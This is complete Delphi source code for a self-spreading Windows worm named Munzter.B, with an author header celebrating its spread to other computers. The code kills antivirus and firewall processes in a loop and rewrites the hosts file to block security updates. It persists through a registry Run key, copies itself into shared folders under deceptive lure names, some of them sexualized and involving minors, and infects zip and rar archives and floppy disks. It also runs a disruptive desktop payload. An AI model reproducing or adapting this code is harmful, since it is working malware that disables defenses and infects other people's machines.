   {

     designed & programmed by: Byt3Cr0w/GEDZAC
     Start Date: 15/08/04
     End Date: 17/08/04
     Bio Cells: 52224
     Project Name: MunzterCell
     Virus Cell: Munzter.B
     Comments Or Description:

     About The MunzterCell Project:
   °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
   *********************************************************************************************************
   * This is a project that i start in july of 2004 motivated by some personnal problems                   *
   * i think "in everyone there is a monster inside her bodys a monster who is hide...but in one moment    *
   * he can appear and change your life.." that inspired me to bring this monster to my computer ;)         *
   * (and maybe to another computers :D) so i start writing the code.                                      *
   *                                                                                                       *
   * The Munzter evolves in every version, every version is better than the old version :)                 *
   * i dont know the number of versions the time will say that ;).                     *
   *********************************************************************************************************

     About Munzter.B:
   °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
   *****************************************************************************************************************************
   *  This is the Evolution of Munzter.A now is a P2P Worm with some new features: multi-threading,modyfication of hosts files,*                   *
   *  kill some AV/FW procces in Memory, a very good payload and he search for folders with the word "Share" and copy him self *                       *
   *  to the folders.*
   *  the Payload date is: 15 ;)                                                                               *
   *****************************************************************************************************************************
   }

   program MunzterB;

    {$APPTYPE CONSOLE}
   uses
     SYsUtils,
     windows,
     TLHelp32;

   var ID:dword;
         pro:Array[1..35] of string;
         i:integer;
         Wiz,Riz:string;

   function Kill(ExeFileName: string): integer;
   const
   PROCESS_TERMINATE=$0001;
   var
   ContinueLoop: BOOL;
   FSnapshotHandle: THandle;
   FProcessEntry32: TProcessEntry32;
   begin
   result := 0;
   FSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   FProcessEntry32.dwSize:=Sizeof(FProcessEntry32);
   ContinueLoop:=Process32First(FSnapshotHandle,FProcessEntry32);
   while integer(ContinueLoop)<>0 do begin
   if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))=UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile)=UpperCase(ExeFileName))) then
   Result:=Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),FProcessEntry32.th32ProcessID), 0));
   ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
   end;
   CloseHandle(FSnapshotHandle);
   end;

   procedure duerme;
   begin
   sleep(120000);
   end;

   procedure rarziphex(folder,tipo:AnsiString);
   var buscame  : TSearchRec;
       encontrado    : String;
       anne : Integer;
   begin
      if folder[Length(folder)] <> '\' then folder := folder +'\';
      anne := FindFirst(folder + '*.*', faAnyfile,buscame); while anne = 0 do
       begin
         if (buscame.name <> '.' ) and (buscame.name <> '..' ) and (buscame.name <> 'WINDOWS' ) and (buscame.Name <> 'WinNT') then
           if buscame.Attr and faDirectory > 0 then
           begin

           rarziphex(folder+buscame.Name,tipo);
           end;
         anne := FindNext(buscame);
       end;
      if folder[Length(folder)] <> '\' then folder := folder + '\';
      anne := FindFirst(folder+tipo, faAnyFile - faDirectory,buscame);
      while anne = 0 do
       begin
         if(buscame.name <> '.') and (buscame.name <> '..') and (buscame.name <> '')
            then begin
                  encontrado := folder + buscame.name;
              writeln(encontrado);
              if tipo = '*.zip' then WinExec(Pchar(Wiz+' -a '+encontrado+' C:\:).pif'),SW_HIDE);
              if tipo = '*.rar' then WinExec(Pchar(Riz+' a '+encontrado+' C:\:).pif'),SW_HIDE);
                 end;
         anne := FindNext(buscame);
       end;
   end;

   procedure FindShare(folder:AnsiString);
   var buscame  : TSearchRec;
       encontrado    : String;
       anne,i: Integer;
       o: Array[1..10] of string;
   begin
   o[1] := 'NOD32_3.0.exe'; o[2] := 'LooknStop30.exe'; o[3] := 'TDS-4.exe'; o[4] := 'Kaspersky_weird_movie.mpeg.exe'; o[5] := 'Madonna_13years.jpg.exe'; o[6] := 'Madonna_with_britneypussy.avi.exe'; o[7] := 'KAV60.exe'; o[8] := 'WindowsLongHornBETA1.exe';
   o[9] := 'MTVMusicAwards2004_complete.exe'; o[10] := 'WorldDisney_teens.exe';
      if folder[Length(folder)] <> '\' then folder := folder +'\';
      anne := FindFirst(folder + '*.*', faDirectory,buscame); while anne = 0 do
       begin
         if (buscame.name <> '.' ) and (buscame.name <> '..' ) and (buscame.name <> 'WINDOWS' ) and (buscame.Name <> 'WinNT') then
           if buscame.Attr and faDirectory > 0 then
           begin

           FindShare(folder+buscame.Name);
           end;
         anne := FindNext(buscame);
       end;
      if folder[Length(folder)] <> '\' then folder := folder + '\';
      anne := FindFirst(folder+'*share*', faDirectory,buscame);
      while anne = 0 do
       begin
         if(buscame.name <> '.') and (buscame.name <> '..') and (buscame.name <> '')
            then begin
                  encontrado := folder + buscame.name;
             for i := 1 to 10 do try CopyFile(Pchar(paramstr(0)),Pchar(encontrado+'\'+o[i]),true); except end;

                 end;
         anne := FindNext(buscame);
       end;
   end;

   function Killer:integer;
   label hunt;
   begin
   pro[1] := 'nod32krn.exe'; pro[2] := 'nod32kui.exe'; pro[3] := 'nod32.exe'; pro[4] := 'avpcc.exe'; pro[5] := 'looknstop.exe'; pro[6] := '_looknstop.exe'; pro[7] := 'tds-3.exe'; pro[8] := 'dcsmutex.exe'; pro[9] := 'vsmon.exe';
   pro[10] := 'smc.exe'; pro[11] := 'Drweb32w.exe'; pro[12]:= 'Drwebupw.exe'; pro[13]:= 'avp32.exe'; pro[14] := 'klav.exe'; pro[15] := 'amon9x.exe'; pro[16] := 'ad-aware.exe'; pro[17] := 'teatimer.exe'; pro[18] := 'Avpm.exe';
   pro[19] := 'SpybotSD.exe'; pro[20] := 'blindman.exe'; pro[21]:= 'spydoctor.exe'; pro[22] := 'spywareblaster.exe'; pro[23]:='sgbhp.exe'; pro[24]:= 'vcool.exe'; pro[25] := 'sgliveupdate.exe'; pro[26] := 'sgmain.exe';
   pro[27]:= 'AVPUPD.EXE'; pro[28] := 'luall.exe'; pro[29] := 'outpost.exe'; pro[20] := 'BlackICE.exe'; pro[21] := 'ccApp.exe'; pro[22] := 'ccEvtMgr.exe'; pro[23] := 'ccPxySvc.exe'; pro[24] := 'Navw32.exe'; pro[25] := 'NAVWNT.EXE';
   pro[26] := 'tc.exe'; pro[27] := 'vet32.exe'; pro[28] := 'vet95.exe'; pro[29] := 'vshwin32.exe'; pro[30] := 'VSMAIN.EXE'; pro[31] := 'DCSUserProt.exe'; pro[32] := 'procguard.exe'; pro[33] := 'tds-4.exe'; pro[34] := 'wormguard.exe'; pro[35] := 'kav.exe';
   hunt:
   for i:= 1 to 35 do Kill(pro[i]);
   Duerme;
   goto hunt;
   end;

   function flopper:integer;
   label floop;
   label travel;
   label wait;
   var shhh:dword;
   begin
   shhh := SetErrorMode(SEM_FailCriticalErrors);
   floop:
   if fileexists('A:\NULL') then goto travel;
   goto wait;
   travel:
   Copyfile(Pchar(Paramstr(0)),Pchar('A:\;).pif'),false);
   wait:
   Duerme;
   goto floop;
   end;

   function infect:integer;
   var dir : Char;
   dir2:char;
   begin
   if FileExists('C:\Program Files\Winzip\winzip32.exe') then Wiz := 'C:\Program Files\Winzip\winzip32.exe';
   if FileExists('C:\Archivos de programa\Winzip\winzip32.exe') then Wiz := 'C:\Archivos de programa\Winzip\winzip32.exe';
   if FileExists('C:\Archivos de programa\WinRAR\winrar.exe') then Riz := 'C:\Archivos de programa\WinRAR\winrar.exe';
   if FileExists('C:\Program Files\WinRAR\winrar.exe') then Riz := 'C:\Program Files\WinRAR\winrar.exe';
   if Wiz <> '' then for dir := 'C' to 'Z' do rarziphex(dir+':\','*.zip');
   if Riz <> '' then for dir2 := 'C' to 'Z' do rarziphex(dir2+':\','*.rar');
   end;


   function sysfol():string;
   var sysfolx:pChar;
   begin
   GetMem(sysfolx,100);
   if GetSystemDirectory(sysfolx,100) <> 0 then
   begin
     sysfol := sysfolx + '\';
   end;
   FreeMem(sysfolx,100);
   end;


   function hehehe:integer;
   var dire:char;
   begin
   for dire:= 'C' to 'Z' do FindShare(dire+':\');
   end;

   function host:integer;
   const SP = #13#10;
   var z:string;
       x:textfile;
   begin
   z := '127.0.0.1 #'+sp+'#'+sp+'127.0.0.1 u3.eset.com'+sp+
   '127.0.0.1 u1.eset.com'+sp+
   '127.0.0.1 u4.eset.com'+sp+
   '127.0.0.1 www.nod32.com'+sp+
   '127.0.0.1 www.nod32.sk'+sp+
   '127.0.0.1 www.diamondcs.com.au'+sp+
   '127.0.0.1 updates.sald.com'+sp+
   '127.0.0.1 http://updates.sald.com/drweb'+sp+
   '127.0.0.1 http://updates1.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 http://updates2.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 http://updates3.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 ftp://updates3.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 http://updates-us1.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 http://downloads1.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 http://downloads-us1.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 ftp://downloads1.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 ftp://downloads-us1.kaspersky-labs.com/updates'+sp+
   '127.0.0.1 updates.zonelabs.com'+sp+
   '127.0.0.1 liveupdate.symantecliveupdate.com'+sp+
   '127.0.0.1 liveupdate.symantec.com'+sp+
   '127.0.0.1 liveupdate.symantecliveupdate.com'+sp+
   '127.0.0.1 update.symantec.com'+sp+
   '127.0.0.1 download.mcafee.com'+sp+
   '127.0.0.1 http://www.toonbox.de/tds'+sp+
   '127.0.0.1 ftp://ftp.pc-techie.info/tds'+sp+
   '127.0.0.1 http://radius.turvamies.com'+sp+
   '127.0.0.1 http://fractus.mat.uson.mx/~tds'+sp+
   '127.0.0.1 http://tds.diamondcs.com.au/'+sp+
   '127.0.0.1 http://diamondcs.fileburst.com';
   AssignFile(x,sysfol + '\drivers\etc\hosts');
   rewrite(x); writeln(x,z); closefile(x);
   end;

   function Printx( z:String ) : String;
   var a : TRect;
   begin
        a.Left := 400;
        a.Top  := 300;
        a.Right := 1500;
        a.Bottom := 1500;
        DrawText( GetWindowDC( Getdesktopwindow()),Pchar(z ),length(z),a,0);
   end;

   function start:integer;
   const SP = #13#10;
   var a,b:textfile;
       re:string;
       x:integer;

   begin
   Randomize;
   x := Random(9000) + 1;
   Copyfile(Pchar(paramstr(0)),Pchar(sysfol+'\'+InTToStr(x)+'.exe'),true);
   re := 'Set cnuy2gf08165 = CreateObject("WScript.Shell")'+sp+
   'cnuy2gf08165.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\WinStart", "'+sysfol+'\'+InTToStr(x)+'.exe"';
   AssignFile(a,'C:\0383272.vbs');
   rewrite(a); writeln(a,re); closefile(a);
   WinExec(Pchar('wscript.exe C:\0383272.vbs'),SW_HIDE);
   AssignFile(b,sysfol+'\93756.tmp');
   rewrite(b); writeln(b,':)'); closefile(b);
   end;

   function payload:integer;
   var x:integer;
       hand,h:thandle;
       rre,err:boolean;
       Time:TSystemTime;
       label gogo;
   begin
   GetlocalTime(Time);
   if not Time.Wday = 15 then exit;
   Randomize;
   gogo:
   x := Random(9000) + 1;
   Printx('*-+[-Munzter by Byt3Cr0w/GEDZAC-]+-*');
      MessageBeep( 1111111 );
       try SetWindowText( GetActiveWindow, PChar('You are now part of the family! :) ID:'+InTToStr(x) )); except end;
        SetCursorPos( 800 - 15, 600 - 15 );
             SetCursorPos( x, Random( 800 ) );
                  hand := FindWindow( 'Shell_TrayWnd' , nil );
       hand := FindWindowEx( hand , HWND( 0 ) , 'TrayNotifyWnd' , nil );
     if err then
        begin
              ShowWindow( hand, SW_HIDe );
              err := false;
        end
        else begin
                 ShowWindow( hand , SW_Show );
                 err :=true;
             end;
              h := FindWindow( 'Shell_TrayWnd', nil );
        if rre then
        begin
             ShowWindow( h , SW_Hide );
             rre := false;
        end
        else
        begin
              ShowWindow( h , SW_SHOW );
              rre := true;
        end;
        goto gogo;
      END;







   begin
   CreateMutex(nil, false, 'Munzter');
   if GetLastError = ERROR_ALREADY_EXISTS then exitprocess(0);
    ShowWindow(FindWindowA(0,pChar(ParamStr(0))),0);
    CreateMutex(nil, false, 'Munzter by Byt3Cr0w/GEDZAC');
   if not fileexists(sysfol+'\93756.tmp') then CreateThread(nil,0,@start,nil,0,ID);
   CreateThread(nil,0,@killer,nil,0,ID);
   CreateThread(nil,0,@flopper,nil,0,ID);
   CreateThread(nil,0,@infect,nil,0,ID);
   CreateThread(nil,0,@hehehe,nil,0,ID);
   CreateThread(nil,0,@host,nil,0,ID);
   CreateThread(nil,0,@payload,nil,0,ID);
   sleep($ffffffff);
   end.
